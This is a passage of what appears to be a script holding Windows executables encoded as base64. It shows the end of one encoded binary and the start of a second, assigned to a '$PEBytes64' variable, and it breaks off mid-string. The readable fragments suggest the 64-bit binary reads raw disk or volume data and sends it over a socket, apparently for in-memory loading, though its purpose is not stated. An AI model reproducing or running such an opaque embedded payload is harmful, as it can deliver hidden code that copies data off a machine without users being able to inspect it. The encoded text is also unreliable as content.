AD2AT9fSW5pdEA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElBRVhYWgAAkQU/c2V0Z0A/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElBRVhQQUQwMEBaAADsAz9nZXRsb2NAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQkU/QVZsb2NhbGVAMkBYWgAAJgA/PzA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQElBRUBYWgAAFQY/dW5zaGlmdEA/JGNvZGVjdnRARERIQHN0ZEBAUUJFSEFBSFBBRDFBQVBBREBaAAARAD8/MD8kYmFzaWNfaXN0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFBRUBQQVY/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQF9OQFoAHAA/PzA/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVAUEFWPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBfTkBaAAMAPz8wPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBJQUVAWFoAAJkCP2NsZWFyQD8kYmFzaWNfaW9zQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFWEhfTkBaAMUFP3NwdXRjQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFSERAWgDmBD9vdXRAPyRjb2RlY3Z0QERESEBzdGRAQFFCRUhBQUhQQkQxQUFQQkRQQUQzQUFQQURAWgAwBD9pbkA/JGNvZGVjdnRARERIQHN0ZEBAUUJFSEFBSFBCRDFBQVBCRFBBRDNBQVBBREBaAAB7AD8/MT8kYmFzaWNfaXN0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFVBRUBYWgAAkQM/Zmx1c2hAPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUFFQUFWMTJAWFoADwE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVBQVYwMUBQNkFBQVYwMUBBQVYwMUBAWkBaAAB+AD8/MT8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFVBRUBYWgAAnAU/c2V0c3RhdGVAPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRQUVYSF9OQFoAAHUAPz8xPyRiYXNpY19pb3NARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBVQUVAWFoAADgGP3hzcHV0bkA/JGJhc2ljX3N0cmVhbWJ1ZkBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQE1BRV9KUEJEX0pAWgA1Bj94c2dldG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBNQUVfSlBBRF9KQFoArAU/c2hvd21hbnljQD8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBATUFFX0pYWgCBAD8/MT8kYmFzaWNfc3RyZWFtYnVmQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAVUFFQFhaAABrAz9lbmRsQHN0ZEBAWUFBQVY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAMUBBQVYyMUBAWgAAkQI/YWx3YXlzX25vY29udkBjb2RlY3Z0X2Jhc2VAc3RkQEBRQkVfTlhaAACeAT9fRGVjcmVmQGZhY2V0QGxvY2FsZUBzdGRAQFFBRVBBVjEyM0BYWgDzAT9fSW5jcmVmQGZhY2V0QGxvY2FsZUBzdGRAQFFBRVhYWgA6AT8/QmlkQGxvY2FsZUBzdGRAQFFBRUlYWgAATVNWQ1AxMDAuZGxsAADqAEVuY29kZVBvaW50ZXIAygBEZWNvZGVQb2ludGVyAOwCSW50ZXJsb2NrZWRFeGNoYW5nZQCyBFNsZWVwAOkCSW50ZXJsb2NrZWRDb21wYXJlRXhjaGFuZ2UAANMCSGVhcFNld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"
    $PEBytes64 = "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